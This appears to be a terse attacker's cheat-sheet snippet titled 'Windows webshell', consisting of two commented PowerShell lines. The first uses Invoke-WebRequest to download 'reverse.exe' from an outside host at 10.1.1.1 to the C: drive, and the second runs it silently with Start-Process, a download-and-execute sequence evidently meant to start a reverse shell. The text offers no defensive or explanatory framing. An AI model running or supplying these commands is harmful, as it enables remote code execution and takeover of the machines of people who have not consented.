Windows webshell...
Invoke-WebRequest -Uri "http://10.1.1.1/reverse.exe" -OutFile "C:\reverse.exe"    //file download
Start-Process "C:\reverse.exe" -ArgumentList "/silent" -Wait -PassThru   //file exe  

